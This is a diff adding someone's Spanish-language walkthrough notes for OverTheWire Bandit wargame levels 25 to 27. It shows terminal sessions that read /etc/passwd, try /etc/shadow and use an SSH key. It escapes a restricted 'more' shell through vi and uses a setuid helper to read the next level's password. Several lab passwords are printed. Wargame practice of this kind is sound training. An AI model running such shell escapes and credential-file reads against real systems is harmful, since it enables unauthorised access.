@@ -1,0 +1,182 @@
+s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+
+bandit25@bandit:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+syslog:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
+uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
+tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:106:1::/var/cache/pollinate:/bin/false
+tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
+ec2-instance-connect:x:109:65534::/nonexistent:/usr/sbin/nologin
+_chrony:x:110:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+stunnel4:x:988:988:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
+bandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bash
+bandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bash
+bandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bash
+bandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bash
+bandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bash
+bandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bash
+bandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bash
+bandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bash
+bandit16:x:11016:11016:bandit level 16:/home/bandit16:/bin/bash
+bandit17:x:11017:11017:bandit level 17:/home/bandit17:/bin/bash
+bandit18:x:11018:11018:bandit level 18:/home/bandit18:/bin/bash
+bandit19:x:11019:11019:bandit level 19:/home/bandit19:/bin/bash
+bandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bash
+bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash
+bandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bash
+bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash
+bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash
+bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash
+bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash
+bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash
+bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash
+bandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bash
+bandit30:x:11030:11030:bandit level 30:/home/bandit30:/bin/bash
+bandit31:x:11031:11031:bandit level 31:/home/bandit31:/bin/bash
+bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell
+bandit33:x:11033:11033:bandit level 33:/home/bandit33:/bin/bash
+bandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bash
+bandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bash
+bandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bash
+bandit7:x:11007:11007:bandit level 7:/home/bandit7:/bin/bash
+bandit8:x:11008:11008:bandit level 8:/home/bandit8:/bin/bash
+bandit9:x:11009:11009:bandit level 9:/home/bandit9:/bin/bash
+bandit27-git:x:11527:11527::/home/bandit27-git:/usr/bin/git-shell
+bandit28-git:x:11528:11528::/home/bandit28-git:/usr/bin/git-shell
+bandit29-git:x:11529:11529::/home/bandit29-git:/usr/bin/git-shell
+bandit30-git:x:11530:11530::/home/bandit30-git:/usr/bin/git-shell
+bandit31-git:x:11531:11531::/home/bandit31-git:/usr/bin/git-shell
+drifter0:x:19000:19000:drifter level 0:/home/drifter0:/bin/bash
+drifter1:x:19001:19001:drifter level 1:/home/drifter1:/bin/bash
+drifter10:x:19010:19010:drifter level 10:/home/drifter10:/bin/bash
+drifter12:x:19012:19012:drifter level 12:/home/drifter12:/bin/bash
+drifter13:x:19013:19013:drifter level 13:/home/drifter13:/bin/bash
+drifter14:x:19014:19014:drifter level 14:/home/drifter14:/bin/bash
+drifter15:x:19015:19015:drifter level 15:/home/drifter15:/bin/bash
+drifter2:x:19002:19002:drifter level 2:/home/drifter2:/bin/bash
+drifter3:x:19003:19003:drifter level 3:/home/drifter3:/bin/bash
+drifter4:x:19004:19004:drifter level 4:/home/drifter4:/bin/bash
+drifter5:x:19005:19005:drifter level 5:/home/drifter5:/bin/bash
+drifter6:x:19006:19006:drifter level 6:/home/drifter6:/bin/bash
+drifter7:x:19007:19007:drifter level 7:/home/drifter7:/bin/bash
+drifter8:x:19008:19008:drifter level 8:/home/drifter8:/bin/bash
+drifter9:x:19009:19009:drifter level 9:/home/drifter9:/bin/bash
+formulaone0:x:20000:20000:formulaone level 0:/home/formulaone0:/bin/bash
+formulaone1:x:20001:20001:formulaone level 1:/home/formulaone1:/bin/bash
+formulaone2:x:20002:20002:formulaone level 2:/home/formulaone2:/bin/bash
+formulaone3:x:20003:20003:formulaone level 3:/home/formulaone3:/bin/bash
+formulaone5:x:20005:20005:formulaone level 5:/home/formulaone5:/bin/bash
+formulaone6:x:20006:20006:formulaone level 6:/home/formulaone6:/bin/bash
+krypton1:x:8001:8001:krypton level 1:/home/krypton1:/bin/bash
+krypton2:x:8002:8002:krypton level 2:/home/krypton2:/bin/bash
+krypton3:x:8003:8003:krypton level 3:/home/krypton3:/bin/bash
+krypton4:x:8004:8004:krypton level 4:/home/krypton4:/bin/bash
+krypton5:x:8005:8005:krypton level 5:/home/krypton5:/bin/bash
+krypton6:x:8006:8006:krypton level 6:/home/krypton6:/bin/bash
+krypton7:x:8007:8007:krypton level 7:/home/krypton7:/bin/bash
+bandit25@bandit:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+bandit25@bandit:~$ ls -la
+total 40
+drwxr-xr-x  2 root     root     4096 Jul 17 15:57 .
+drwxr-xr-x 70 root     root     4096 Jul 17 15:58 ..
+-rw-r-----  1 bandit25 bandit25   33 Jul 17 15:57 .bandit24.password
+-r--------  1 bandit25 bandit25 1679 Jul 17 15:57 bandit26.sshkey
+-rw-r-----  1 bandit25 bandit25  151 Jul 17 15:57 .banner
+-rw-r--r--  1 root     root      220 Mar 31 08:41 .bash_logout
+-rw-r--r--  1 root     root     3771 Mar 31 08:41 .bashrc
+-rw-r-----  1 bandit25 bandit25   66 Jul 17 15:57 .flag
+-rw-r-----  1 bandit25 bandit25    4 Jul 17 15:57 .pin
+-rw-r--r--  1 root     root      807 Mar 31 08:41 .profile
+bandit25@bandit:~$ cat .ba
+.bandit24.password  .banner             .bash_logout        .bashrc
+bandit25@bandit:~$ cat .bandit24.password
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+bandit25@bandit:~$ cat bandit26.sshkey
+-----BEGIN RSA PRIVATE KEY-----
+
+-----END RSA PRIVATE KEY-----
+
+
+en este punto creo n archivo que se llama llave26
+
+luego accedo con lo siguiente
+
+ssh -i llave26.txt bandit26@bandit.labs.overthewire.org -p2220
+
+esto hace que me saque
+
+Enjoy your stay!
+
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+Connection to bandit.labs.overthewire.org closed.
+
+tengo que tener la consola en pantalla chica y luego que aparezca la palabra more le apriento la tecla v y me abre el editor de Linux vi
+
+
+:set shell=/bin/bash
+
+y después solo escribimos Shell en vi y ya puedo acceder
+
+~                                                                                                                       ~                                                                                                                       :shell
+[No write since last change]
+bandit26@bandit:~$ ls -la
+total 44
+drwxr-xr-x  3 root     root      4096 Jul 17 15:57 .
+drwxr-xr-x 70 root     root      4096 Jul 17 15:58 ..
+-rwsr-x---  1 bandit27 bandit26 14880 Jul 17 15:57 bandit27-do
+-rw-r--r--  1 root     root       220 Mar 31 08:41 .bash_logout
+-rw-r--r--  1 root     root      3771 Mar 31 08:41 .bashrc
+-rw-r--r--  1 root     root       807 Mar 31 08:41 .profile
+drwxr-xr-x  2 root     root      4096 Jul 17 15:57 .ssh
+-rw-r-----  1 bandit26 bandit26   258 Jul 17 15:57 text.txt
+bandit26@bandit:~$ whoami
+bandit26
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+bandit26@bandit:~$
+
